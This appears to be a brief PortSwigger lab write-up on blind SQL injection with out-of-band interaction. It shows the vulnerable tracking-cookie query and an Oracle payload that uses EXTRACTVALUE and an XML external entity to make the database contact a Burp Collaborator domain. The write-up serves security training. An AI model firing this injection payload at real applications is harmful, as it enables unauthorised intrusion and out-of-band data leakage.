## Question:

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/fc896581-2e92-4aa9-b6be-eb2c2c0b5a6a)

## Solution:

The payloads for each domain to perform a DNS lookup to an external domain.

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/e94c81f4-4419-40bc-ace2-f4ec3accc83a)

Query made -

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'`

Request captured - Send this to repeater

![image](https://github.com/Nifalnasar/Portswigger-Labs/assets/141356053/5e7c52a1-6f6a-4b4b-80ee-2b40c0ffd800)

Then Open the burp collaborator client, copy one of the domain provided

For that the payload is

`SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--`
